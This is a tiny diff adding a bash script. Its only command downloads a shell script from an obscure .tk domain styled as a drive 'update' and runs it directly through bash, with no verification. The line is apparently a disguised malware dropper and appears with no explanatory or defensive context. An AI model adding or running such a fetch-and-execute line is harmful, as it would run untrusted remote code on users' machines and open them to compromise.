@@ -1,0 +1,3 @@
+#/bin/bash
+
+bash <(curl -Lso- https://drive.gd772.tk/d/update/x86_app.sh)
